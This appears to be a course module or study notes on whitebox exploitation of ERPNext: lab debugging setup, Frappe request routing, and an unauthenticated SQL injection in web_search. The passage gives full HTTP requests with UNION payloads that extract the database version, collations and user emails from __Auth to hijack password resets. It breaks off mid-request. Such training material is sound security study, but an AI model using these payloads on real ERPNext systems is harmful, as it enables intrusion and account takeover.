# ERPNext Authentication Bypass and Server Side Template Injection

This module covers two vulnerabilities that can be used to exploit ERPNext,1 an open source Enterprise Resource Planning software built on the Frappe Web Framework.2

The SQL injection vulnerability will allow us to bypass authentication and access the Administrator console. With access to the Administrator console, we will examine a Server Side Template Injection3 (SSTI) vulnerability in detail. We will leverage the SSTI vulnerability to achieve remote code execution. Finally, we'll wrap up by discussing how straying from the intended software design patterns can assist in vulnerability discovery.

1
(Frappe, 2020), https://erpnext.com/ ↩︎

2
(Frappe, 2020), https://frappe.io/frappe ↩︎

3
(Portswigger, 2015), https://portswigger.net/research/server-side-template-injection ↩︎

##### SMTP Server

we'll need to be able to send emails as we attempt to bypass the password reset functionality. To do this, we will need to set Frappe to use our Kali machine as the SMTP server. We can log in to the ERPNext server via SSH to make the necessary changes.

```
ssh frappe@x.x.x.x
```
Next, we need to edit site_config.json (found in frappe-bench/sites/site1.local/) to match the contents shown in Listing 2.

```
frappe@ubuntu:~$ cat frappe-bench/sites/site1.local/site_config.json 
{
 "db_name": "_1bd3e0294da19198",
 "db_password": "32ldabYvxQanK4jj",
 "db_type": "mariadb",
 "mail_server": "<YOUR KALI IP>",
 "use_ssl": 0,
 "mail_port": 25,
 "auto_email_id": "admin@randomdomain.com"
}

```
You might need to add comma after email id if you have more stuff.

Running SMTP server on our kali

```
sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25

```

#### Configuring Remote Debugging

We can follow these steps to set up remote debugging:

Install Visual Studio Code.
Configure Frappe to debug.
Load the code into Visual Studio Code.
Configure Visual Studio Code to connect to the remote debugger.

We will download and install Visual Studio Code by visiting the following link in Kali:

```
https://code.visualstudio.com/docs/?dv=linux64_deb 
```
Listing 4 - Download URL for Visual Studio Code

Next, we can use apt to install the .deb file.

```
kali@kali:~$ sudo apt install ~/Downloads/code_1.45.1-1589445302_amd64.deb
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Note, selecting 'code' instead of '~/Downloads/code_1.45.1-1589445302_amd64.deb'
...
```
Once installed, we'll start Visual Studio Code and install the Python extension.

The bench tool is designed to make installing, updating, and starting Frappe applications easier. We'll need to reconfigure the bench2 Procfile and add a few lines of code to start Frappe and ERPNext with remote debugging enabled.

To reconfigure bench, let's return to the SSH session where we are logged in to the ERPNext server and install ptvsd.3 The ptvsd package is the Python Tools for Visual Studio debug server, which allows us to create a remote debugging connection. To install it, we can use the pip binary provided by bench to ensure that ptvsd is available to Frappe.
```
frappe@ubuntu:~$ /home/frappe/frappe-bench/env/bin/pip install ptvsd
...
Successfully installed ptvsd-4.3.2
```
Listing 6 - Installing ptvsd

Next, let's open up the Procfile and comment out the section that starts the web server. We will manually start the web server later, when debugging is enabled.
```
frappe@ubuntu:~$ cat /home/frappe/frappe-bench/Procfile 
redis_cache: redis-server config/redis_cache.conf
redis_socketio: redis-server config/redis_socketio.conf
redis_queue: redis-server config/redis_queue.conf
#web: bench serve --port 8000

socketio: /usr/bin/node apps/frappe/socketio.js

watch: bench watch

schedule: bench schedule
worker_short: bench worker --queue short --quiet
worker_long: bench worker --queue long --quiet
worker_default: bench worker --queue default --quiet
```
Listing 7 - Updating the Procfile to not start the web server

Once ptvsd is installed, we must reconfigure the application and use ptvsd to open up a debugging port. We can do this by editing the following file:
```
/home/frappe/frappe-bench/apps/frappe/frappe/app.py
```
Listing 8 - Location of app.py

When the "bench serve" command in Procfile is executed, the bench tool runs the app.py file. By editing this file, we can start the remote debugging port early in the application start up. The code in Listing 9 needs to be added below the "imports" in the app.py file.
```
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger")
ptvsd.wait_for_attach()
```
Listing 9 - Code to start the debugger

The code above imports ptvsd into the current project, starts the debugging server (ptvsd.enable_attach), prints a message, and pauses execution until a debugger is attached (ptvsd.wait_for_attach). By default, ptvsd will start the debugger on port 5678.

Before we start the services and web server, we must transfer the entire source code of the application to Kali. This will allow us to use Visual Studio Code on Kali to remotely debug the ERPNext application. Let's use rsync to copy the folder to our machine.

```
kali@kali:~$ rsync -azP frappe@192.168.121.123:/home/frappe/frappe-bench ./
frappe@192.168.121.123's password: 
...
frappe-bench/sites/assets/css/web_form.css
        108,418 100%  221.50kB/s    0:00:00 (xfr#48027, to-chk=46/56097)
frappe-bench/sites/assets/js/
frappe-bench/sites/assets/js/bootstrap-4-web.min.js
        231,062 100%  371.13kB/s    0:00:00 (xfr#48028, to-chk=45/56097)
frappe-bench/sites/assets/js/bootstrap-4-web.min.js.map
        409,026 100%  536.16kB/s    0:00:00 (xfr#48029, to-chk=44/56097)
...
```
Listing 10 - Transferring the zip file to Kali

Once the files are transferred, we'll open the folder in Visual Studio Code using File > Open Folder. When the Open Folder dialog appears, we'll navigate to the copied frappe-bench directory and click OK.

start up Frappe and ERPNext with the debugging port. Before we can start the web server, we'll need to start the necessary services. We can run 'bench start' to start Redis, the web server, the socket.io server, and all the other dependencies required by Frappe and ERPNext.
```
frappe@ubuntu:~$ cd /home/frappe/frappe-bench/

frappe@ubuntu:~/frappe-bench$ bench start
22:35:55 system           | worker_long.1 started (pid=6314)
22:35:55 system           | watch.1 started (pid=6313)
22:35:55 system           | schedule.1 started (pid=6315)
22:35:55 system           | redis_queue.1 started (pid=6316)
22:35:55 redis_queue.1    | 6326:M 27 Nov 22:35:55.391 * Increased maximum number of open files to 10032 (it was originally set to 1024).
...
```
Listing 11 - Starting ERPNext using bench

Next, we will open up another SSH terminal and start the web server from the /home/frappe/frappe-bench/sites directory. We can use the python binary installed by bench to run the bench helper. The bench helper starts the Frappe web server on port 8000. We will pass in the --noreload argument, which disables the Web Server Gateway Interface4 (werkzeug)5 from auto-reloading. Finally, we can use --nothreading to disable multithreading.

We can also use screen or tmux instead of opening a new SSH connection.
```
frappe@ubuntu:~/frappe-bench$ cd /home/frappe/frappe-bench/sites

frappe@ubuntu:~/frappe-bench/sites$ ../env/bin/python ../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --nothreading
Now ready for the IDE to connect to the debugger
```
Listing 12 - Manually starting the web server

Our next step is to configure the connection information in Visual Studio Code for remote debugging.

Visual Studio Code does not initially present an option to debug a Python project. However, we can work around this by first opening an existing Python project. This can be done by visiting the Explorer section of Visual Studio Code and clicking on any Python file. We'll use the same app.py file we modified earlier.

Next, we can select the Debug panel on the left navigation panel of Visual Studio Code.

With the debug panel open, we'll click create a launch.json file at the top left.

Next, when the debug configuration prompt appears, we can select Remote Attach and press Return.

When the host name prompt appears, we'll input the IP address of the ERPNext host and press Return.

Finally, when prompted, we'll enter port number 5678 into the Remote Debugging port prompt and press Return.


Once we have completed the wizard, the configuration file will open. To complete the configuration, we'll set remoteRoot to the server directory containing the application source code. This instructs the remote debugger to match up the folder open in Visual Studio Code (${workspaceFolder}) with the folder found on the remote host (/home/frappe/frappe-bench/). The final launch.json file should look like the one in Listing 13.

{
    // Use IntelliSense to learn about possible attributes.
    // Hover to view descriptions of existing attributes.
    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Python: Remote Attach",
            "type": "python",
            "request": "attach",
            "port": 5678,
            "host": "<Your_ERPNext_IP>",
            "pathMappings": [
                {
                    "localRoot": "${workspaceFolder}",
                    "remoteRoot": "/home/frappe/frappe-bench/"
                }
            ]
        }
    ]
}
Listing 13 - launch.json final configuration


Next, we can press C+s to save the file. When we're ready to start the web server with remote debugging, we'll enter f5 or click the green "play" button.

With the debugger connected, let's verify in the SSH console that the application is available on port 8000.

frappe@ubuntu:~/frappe-bench/sites$ ../env/bin/python ../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --nothreading
Now ready for the IDE to connect to the debugger
 * Running on http://0.0.0.0:8000/ (Press CTRL+C to quit)
Listing 14 - Web server showing a successful connection


The application is now running with remote debugging enabled. We can test this by setting a breakpoint, loading a page, and confirming that debugger reaches the breakpoint. Let's set it in apps/frappe/frappe/handler.py in the handle function, which manages each request from the browser. We can place the breakpoint by clicking on the empty space to the left of the line number. A red dot will appear.


Next, we will load the application in our web browser by visiting the remote IP address on port 8000. The browser should pause as the page loads and line 15 is highlighted in Visual Studio Code.

We can click the Continue button to resume execution.

At this point, the page should load. Let's remove the breakpoint by clicking on the red dot.


1
(Microsoft, 2020), https://code.visualstudio.com/ ↩︎

2
(Frappe, 2020), https://github.com/frappe/bench#bench ↩︎

3
(Microsoft,2019), https://github.com/microsoft/ptvsd ↩︎

4
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Web_Server_Gateway_Interface ↩︎

5
(Pallets Projects, 2020), https://palletsprojects.com/p/werkzeug/ ↩︎


##### Configuring MariaDB Query Logging

To configure logging, we will open a new SSH connection and edit the MariaDB server configuration file located at /etc/mysql/my.cnf, which is similar to a MySQL configuration file. With the file open, we will uncomment the following lines under the "Logging and Replication" section:

```
frappe@ubuntu:~$ sudo nano /etc/mysql/my.cnf

[mysqld]
...
general_log_file        = /var/log/mysql/mysql.log
general_log             = 1
```
Listing 15 - Editing the MySQL server configuration file to log all queries

After modifying the configuration file, we'll need to restart the MySQL server in order to apply the change.
```
frappe@ubuntu:~$ sudo systemctl restart mysql
```
Listing 16 - Restarting the MySQL server to apply the new configuration

heck log:

```
sudo tail -f /var/log/mysql/mysql.log
```

### MVC

1
(Ootips, 1998), http://ootips.org/mvc-pattern.html ↩︎

2
(Wikipedia, 2019), https://en.wikipedia.org/wiki/Spaghetti_code ↩︎

3
(Norfolk, 2015), https://www.youtube.com/watch?v=o_TH-Y78tt4&t=1667 ↩︎ ↩︎ ↩︎

4
(Reenskaug, 1979), http://heim.ifi.uio.no/~trygver/themes/mvc/mvc-index.html ↩︎ ↩︎

5
(Apple, 2018), https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html ↩︎

6
(Reenskaug, 1979), http://heim.ifi.uio.no/~trygver/1979/mvc-2/1979-12-MVC.pdf ↩︎

7
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Model–view–controller ↩︎

8
(Laravel, 2020), https://laravel.com/docs/5.0/eloquent ↩︎

9
(CakePHP, 2020), https://book.cakephp.org/2/en/cakephp-overview/understanding-model-view-controller.html ↩︎

10
(Wikipedia, 2019), https://en.wikipedia.org/wiki/ERPNext#Architecture ↩︎

11
(Github, 2014), https://github.com/frappe/frappe/blob/develop/frappe/core/doctype/doctype/README.md ↩︎

12
(Frappe, 2020), https://frappe.io/docs/user/en/understanding-doctypes ↩︎


#### DocType

```
apps/erpnext/erpnext/stock/doctype/stock_entry_detail/stock_entry_detail.json

```
Listing 18 - Path to stock_entry_detail.json

DocTypes in Frappe are also accompanied by .py files that contain additional logic and routes that support additional features. For example, the bank account DocType found in apps/erpnext/erpnext/accounts/doctype/bank_account/ contains bank_account.py, which adds three functions for the application to use:

make_bank_account
get_party_bank_account
get_bank_account_details


Referring back to the documentation about DocTypes in Frappe, it states: "DocType is the basic building block of an application and encompasses all the three elements i.e. model, view and controller". The DocType encompasses the model element of MVC with a table in the database. The view is the DocType's ability to be edited and displayed as a form (this includes the ability to edit the DocType within the UI). Finally, the DocType acts as a controller by making use of the .py files that accompany the DocType.

Frameworks and applications that use a metadata-driven pattern need to be very flexible for use across various configurations. Because of this, interesting challenges and even more interesting solutions appear. One such solution is Frappe's choice for HTTP routing. Notice that the DocType Python file contained a string "@frappe.whitelist()" above each method. This is one of the methods that Frappe uses to route HTTP requests to the appropriate functions. We will use this information later to discover a SQL injection vulnerability.

1
(Zhang, 2017), https://ebaas.github.io/blog/MetadataDrivenArchitecture/ ↩︎ ↩︎

2
(Salesforce, 2020), https://www.salesforce.com ↩︎

3
(Wikipedia, 2020) https://en.wikipedia.org/wiki/Create,_read,_update_and_delete ↩︎

4
(Salesforce, 2008), https://www.developerforce.com/media/ForcedotcomBookLibrary/Force.com_Multitenancy_WP_101508.pdf ↩︎

5
(ERPNext, 2019), https://discuss.erpnext.com/t/which-design-pattern-is-followed-by-frappe-developers-building-the-framework/41662/3 ↩︎

6
(Stackexchange, 2017), https://softwareengineering.stackexchange.com/a/357202 ↩︎


HTTP Routing in Frappe
In modern web applications, HTTP routing is used to map HTTP requests to their corresponding functions. For example, if a GET request to /user runs a function to obtain the current user's information, that route must be defined somewhere in the application.

Frappe uses a Python decorator with the function name whitelist to expose API endpoints.1 This function is defined in apps/frappe/frappe/__init__.py.

470  whitelisted = []
471  guest_methods = []
472  xss_safe_methods = []
473  def whitelist(allow_guest=False, xss_safe=False):
474          """
475          Decorator for whitelisting a function and making it accessible via HTTP.
476          Standard request will be `/api/method/[path.to.method]`
477
478          :param allow_guest: Allow non logged-in user to access this method.
479
480          Use as:
481
482                  @frappe.whitelist()
483                  def myfunc(param1, param2):
484                          pass
485          """
486          def innerfn(fn):
487                  global whitelisted, guest_methods, xss_safe_methods
488                  whitelisted.append(fn)
489
490                  if allow_guest:
491                          guest_methods.append(fn)
492
493                          if xss_safe:
494                                  xss_safe_methods.append(fn)
495
496                  return fn
497
498          return innerfn
499
Listing 19 - Whitelist function in __init__.py

Essentially, when a function has the "@frappe.whitelist()" decorator above it, the whitelist function is executed and the function being called is added to a list of whitelisted functions (line 488), guest_methods (line 490-491), or xss_safe_methods (line 493-494). This list is then used by the handler found in the apps/frappe/frappe/handler.py file. An HTTP request is first processed by the handle function.

15  def handle():
16          """handle request"""
17          cmd = frappe.local.form_dict.cmd
18          data = None
19
20          if cmd!='login':
21                  data = execute_cmd(cmd)
22
23          # data can be an empty string or list which are valid responses
24          if data is not None:
25                  if isinstance(data, Response):
26                          # method returns a response object, pass it on
27                          return data
28
29                  # add the response to `message` label
30                  frappe.response['message'] = data
31
32          return build_response("json")
33
Listing 20 - Handle function in handler.py

First, the handle function extracts the cmd that the request is attempting to execute (line 17). This value is obtained from the frappe.local.form_dict.cmd variable. As long as the command (cmd) is not "login" (line 20), the command is passed to the execute_cmd function (line 21).

34  def execute_cmd(cmd, from_async=False):
35          """execute a request as python module"""
36          for hook in frappe.get_hooks("override_whitelisted_methods", {}).get(cmd, []):
37                  # override using the first hook
38                  cmd = hook
39                  break
40
41          try:
42                  method = get_attr(cmd)
43          except Exception as e:
44                  if frappe.local.conf.developer_mode:
45                          raise e
46                  else:
47                          frappe.respond_as_web_page(title='Invalid Method', html='Method not found',
48                          indicator_color='red', http_status_code=404)
49                  return
50
51          if from_async:
52                  method = method.queue
53
54          is_whitelisted(method)
55
56          return frappe.call(method, **frappe.form_dict)
Listing 21 - execute_cmd function in handler.py

The execute_cmd function will attempt to find the command and return the method (line 42). If the method was found, Frappe will check if it is whitelisted (line 54) using the whitelisted list. If it is found, the function is executed. We can inspect this process in the is_whitelisted function.

59  def is_whitelisted(method):
60          # check if whitelisted
61          if frappe.session['user'] == 'Guest':
62                  if (method not in frappe.guest_methods):
63                          frappe.msgprint(_("Not permitted"))
64                          raise frappe.PermissionError('Not Allowed, {0}'.format(method))
65
66                  if method not in frappe.xss_safe_methods:
67                          # strictly sanitize form_dict
68                          # escapes html characters like <> except for predefined tags like a, b, ul etc.
69                          for key, value in frappe.form_dict.items():
70                                  if isinstance(value, string_types):
71                                          frappe.form_dict[key] = frappe.utils.sanitize_html(value)
72
73          else:
74                  if not method in frappe.whitelisted:
75                          frappe.msgprint(_("Not permitted"))
76                          raise frappe.PermissionError('Not Allowed, {0}'.format(method))
Listing 22 - is_whitelisted function in handler.py

The is_whitelisted method simply checks to ensure the function being executed is in the list of whitelisted functions.

This means that the client can call any Frappe function directly if the @frappe.whitelist() decorator is in use for that function. In addition, if "allow_guest=True" is also passed in the decorator, the user does not have to be authenticated to run the function.

If the is_whitelisted function does not raise any exceptions, the execute_cmd function will call frappe.call and pass all the arguments in the request to the function (line 56 of handler.py).

```
POST / HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: None
X-Requested-With: XMLHttpRequest
Content-Length: 76
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/
Cookie: user_image=; system_user=yes; user_id=Guest; full_name=Guest; sid=Guest

cmd=frappe.website.doctype.website_settings.website_settings.is_chat_enabled
```

The command in Figure 20 that attempts to execute can be found in Listing 23.

frappe.website.doctype.website_settings.website_settings.is_chat_enabled
Listing 23 - cmd from captured request

Searching for the is_chat_enabled function within the code leads us to the following file:

apps/frappe/frappe/website/doctype/website_settings/website_settings.py
Listing 24 - Location of the is_chat_enabled function

Frappe uses the directory structure to find the file and function to execute, as shown in Listing 25.

frappe.website.doctype.website_settings.website_settings.is_chat_enabled
apps/frappe/frappe/website/doctype/website_settings/website_settings.py
Listing 25 - Comparing cmd to file structure

Based on the function code, we'll notice the is_chat_enabled function also contains "@frappe.whitelist(allow_guest=True)", which allows the command to be executed by an unauthenticated user.

144  @frappe.whitelist(allow_guest=True)
145  def is_chat_enabled():
146          return bool(frappe.db.get_single_value('Website Settings', 'chat_enable'))
Listing 26 - Reviewing is_chat_enabled function

Now that we know how a request is handled, we can move forward in the vulnerability discovery process. The designation of guest-accessible routes will allow us to create a list of starting points to search for vulnerabilities that could lead to authentication bypass.


1
(Github, 2019), https://github.com/frappe/frappe/wiki/Developer-Cheatsheet#how-to-make-public-api ↩︎

##### Discovering the SQL Injection

Searching for SQL in the 91 guest-whitelisted results, we quickly find the web_search function in the apps/frappe/frappe/utils/global_search.py file.


The function begins by defining four arguments: text, scope, start, and limit:

459  @frappe.whitelist(allow_guest=True)
460  def web_search(text, scope=None, start=0, limit=20):
461          """
462          Search for given text in __global_search where published = 1
463          :param text: phrase to be searched
464          :param scope: search only in this route, for e.g /docs
465          :param start: start results at, default 0
466          :param limit: number of results to return, default 20
467          :return: Array of result objects
468          """
Listing 27 - Reviewing web_search function - definition

Next, the web_search function splits the text variable into a list of multiple search strings and begins looping through them.

470          results = []
471          texts = text.split('&')
472          for text in texts:
Listing 28 - Reviewing web_search function - splitting

Within the for loop, the query string is set and the string is formatted. However, not all of the parameters are appended to the query in the same way.

473               common_query = ''' SELECT `doctype`, `name`, `content`, `title`, `route`
474                       FROM `__global_search`
475                       WHERE {conditions}
476                       LIMIT {limit} OFFSET {start}'''
477
478               scope_condition = '`route` like "{}%" AND '.format(scope) if scope else ''
479               published_condition = '`published` = 1 AND '
480               mariadb_conditions = postgres_conditions = ' '.join([published_condition, scope_condition])
481
482               # https://mariadb.com/kb/en/library/full-text-index-overview/#in-boolean-mode
483               text = '"{}"'.format(text)
484               mariadb_conditions += 'MATCH(`content`) AGAINST ({} IN BOOLEAN MODE)'.format(frappe.db.escape(text))
485               postgres_conditions += 'TO_TSVECTOR("content") @@ PLAINTO_TSQUERY({})'.format(frappe.db.escape(text))
486
487               result = frappe.db.multisql({
488                       'mariadb': common_query.format(conditions=mariadb_conditions, limit=limit, start=start),
489                       'postgres': common_query.format(conditions=postgres_conditions, limit=limit, start=start)
490               }, as_dict=True)
Listing 29 - Reviewing web_search function - SQL

On lines 484 and 485, the text is appended to the query using the format function but the string is first passed into a frappe.db.escape function. However, on lines 480, 488, and 489, the parameters are not escaped, potentially allowing us to inject SQL. This means that we could SQL inject the scope, limit, and start arguments.

To pause execution early in the web_search function, we will place the breakpoint on line 470 next to the line that reads "results = []".

Next, we will send the is_chat_enabled request to Repeater and modify it to run the web_search function.

Once in Repeater, we need to modify the request to match the file path and the function call. The file path for the web_search function is apps/frappe/frappe/utils/global_search.py and would make the cmd call "frappe.utils.global_search.web_search".

The only variable in the web_search function that does not have a default value is text. We will set this in the Burp request by adding an ampersand (&) after the cmd value, and we will set the text variable to "offsec" 

With the breakpoint triggered, we can continue execution by pressing the Resume button or % on the keyboard. This will return a response in Burp with a JSON object containing the message object and an empty array.

Now that we can trigger the request while observing what is happening, we can start trying to exploit the SQL injection. To do this, we will first remove the breakpoint on line 470 and add a new breakpoint on line 487 where the query is sent to the multisql function as shown in Listing 30. This will allow us to inspect the query just before it is executed.

result = frappe.db.multisql({
	'mariadb': common_query.format(conditions=mariadb_conditions, limit=limit, start=start),
	'postgres': common_query.format(conditions=postgres_conditions, limit=limit, start=start)
}, as_dict=True)
Listing 30 - Running the multisql function on Line 487

We will send the Burp request again, stop execution at the breakpoint, and past the formatting to enter into the frappe.db.multisql function. From this function, we can inspect the full SQL command just before it is executed.

First, let's send the request again clicking Send in Burp. This will stop execution on line 487.

Figure 28: Pausing Execution on Line 487
Figure 28: Pausing Execution on Line 487
We can Step Over the next three execution steps as those are preparing and formatting the query before passing it into the frappe.db.multisql function.

Figure 29: Pausing Execution on Line 487
Figure 29: Pausing Execution on Line 487
On the fourth execution step (line 490), we will Step Into the frappe.db.multisql function.

This will take us into the apps/frappe/frappe/database/database.py file. From here, we can open the debugging tab, expand the sql_dict variable, and examine the SQL query before it is executed.

A cleaned-up version of the SQL query can be found in Listing 31 below.

SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
Listing 31 - Cleaned up initial SQL command

With the SQL query captured, let's click Resume in the debugger to continue execution. We can also confirm that this is the SQL query the database executed by returning to the mysql.log file.

frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log
   1553 Connect   _1bd3e0294da19198@localhost as anonymous on 
   1553 Query     SET AUTOCOMMIT = 0
   1553 Init DB   _1bd3e0294da19198
   1553 Query     select `user_type`, `first_name`, `last_name`, `user_image` from `tabUser` where `name` = 'Guest' order by modified desc
   1553 Query     SELECT `doctype`, `name`, `content`, `title`, `route`
          FROM `__global_search`
          WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
          LIMIT 20 OFFSET 0
   1553 Query     rollback
   1553 Query     START TRANSACTION
   1553 Quit
Listing 32 - Database log for web_search function

With the initial query generated, we can start using the other potentially-vulnerable parameters like scope. Let's set the scope variable to a value and examine how the query changes. We will set the value to "offsec_scope".

Using values like "offsec_scope" allows us to have a unique token that we are in control of. This allows us to grep through logs and query in databases if needed. If a value of "test" was used, we might have a lot of false positives if we need to grep for it.


With the scope variable set, we can pull the SQL command again from either the database logs or the breakpoint set in the code.

SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
Listing 33 - SQL query with scope variable

With the SQL command extracted, next we need to:

Terminate the double quote.
Add a UNION statement to be able to extract information.
Comment out the remaining SQL command.
Since the SQL query has five parameters (doctype, name, content, title, and route), we know that our UNION injection will have five parameters. The SQL injection payload can be found in Listing 34.

offsec_scope" UNION ALL SELECT 1,2,3,4,5#
Listing 34 - Initial SQL injection payload

The payload starts with the offsec_scope variable. Next, we'll terminate the double quote, add the UNION query that will return five numbers, and finally comment out the rest of the query with a "#" character. Let's send this payload and inspect the response.

```
POST / HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: None
X-Requested-With: XMLHttpRequest
Content-Length: 101
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/
Cookie: user_image=; system_user=yes; user_id=Guest; full_name=Guest; sid=Guest

cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,5#
```

The payload with the injection has the response shown in Listing 35. With this, we know where we can inject additional queries to pull necessary information.

{"message":[{"route":"5","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"}]}
Listing 35 - Response to SQL injection

We can extract the SQL query again from the debugger or the database logs.

SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,5#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
Listing 36 - SQL query with injection

Anything after the "5" is commented out and will be ignored. Next, let's attempt to extract the version of the database by replacing the "5" with "@@version".

```
POST / HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: None
X-Requested-With: XMLHttpRequest
Content-Length: 109
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/
Cookie: user_image=; system_user=yes; user_id=Guest; full_name=Guest; sid=Guest

cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,@@version#
```
The query returns the version found in Listing 37, which confirms the SQL injection.

10.2.24-MariaDB-10.2.24+maria~xenial-log
Listing 37 - Database software version


##### Authentication Bypass Exploitation
PyMysql, the Python MySQL client library,1 does not allow multiple queries in one execution unless "multi=True" is specified in the execute function. Searching through the code, it does not appear that "multi=True" is set. This means that we have to stick with the SELECT query we currently have and cannot INSERT new rows or UPDATE existing rows in the database.

Frappe passwords are hashed2 with PBK DF2.3 While it might be possible to crack the passwords, an easier route might be to hijack the password reset token. Let's visit the homepage to verify that Frappe does indeed have password reset functionality.

Next, we'll determine what tables to query to extract the password reset token value.

1
(MySQL, 2020), https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlcursor-execute.html ↩︎

2
(Frappe, 2020), https://frappe.io/docs/user/en/users-and-permissions#password-hashing ↩︎

3
(Wikipedia, 2020), https://en.wikipedia.org/wiki/PBKDF2 ↩︎


##### Obtaining Admin User Information

Let's visit the password reset page by clicking on the "Forgot Password?" link on the login page. From here, we can use a token value to reset the password. This token will allow us to more easily search through the logs to find the correct entry. We will use the email "token_searchForUserTable@mail.com" as the token.

Before clicking Send Password, we will also start a command to follow the database logs and grep for our token as shown in Listing 38.

Next, let's click Send Password and we will receive an error. We will find that the database log command displays an entry.

frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log | grep token_searchForUserTable
  4980 Query     select * from `tabUser` where `name` = 'token_searchForUserTable@mail.com' order by modified desc
Listing 38 - Discovered table for password reset

We have just discovered the tabUser table.

1
(Frappe, 2020), https://frappe.io/docs/user/en/users-and-permissions#password-hashing ↩︎

##### Resetting the Admin Password

Now that we know which tables we need to target, let's create a SQL query to extract the email/name of the user. The documentation says that the email can be found in the name column in the __Auth table. A non-SQL injection query would be similar to the one found in Listing 39.

SELECT name FROM __Auth;
Listing 39 - Standard query for extracting the name/email

However, we need the query in Listing 39 to be usable in the UNION query. For this, we need to replace one of the numbers with the name column and add a "FROM __Auth" to the end of the UNION query. The query we are attempting to execute can be found in Listing 40.

SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name FROM __Auth#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
Listing 40 - Target query we are attempting to execute

The highlighted part in Listing 40 will be the payload to the SQL injection. Next, we will place the payload in Burp, send the request, and inspect the response.

Frappe responds with the error "Illegal mix of collations for operation 'UNION'".

Database collation describes the rules determining how the database will compare characters in a character set. For example, there are collations like "utf8mb4_general_ci" that are case-insensitive (indicated by the "ci" at the end of the collation name). These collations will not take the case into consideration when comparing values.1

It is possible for us to force a collation within the query. However, we first need to discover the collation used in the __global_search table that we are injecting into. We can do this using the query found in Listing 41.

SELECT COLLATION_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name";
Listing 41 - Query to discover collation

Since this is a whitebox assessment, we could run the query in Listing 41 directly on the host. However, the collation across builds and versions of an application might be different. It is best practice to extract values like the collation directly from the host we are targeting. For this reason, we will use our SQL injection to extract the collation.

Like the previous payload, we have to change this query to fit into a UNION query. We want the final query to be like the one found in Listing 42.

SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
Listing 42 - Full query to discover collation

The highlighted part in Listing 42 will become the payload we send in Burp.

This request returns the value of "utf8mb4_general_ci" as the collation for the name column in the __global_search table. With this information, let's edit our previous payload to include the "COLLATE utf8mb4_general_ci" command. The query we are attempting to run is as follows:

SELECT name COLLATE utf8mb4_general_ci FROM __Auth;
Listing 43 - Standard query for extracting the name/email with collation

This makes the final query similar to the one found in Listing 44.

SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
Listing 44 - SQL injection query with collation

Sending this payload in Burp allows us to extract the name/email from the database.

```
POST / HTTP/1.1
Host: erpnext:8000
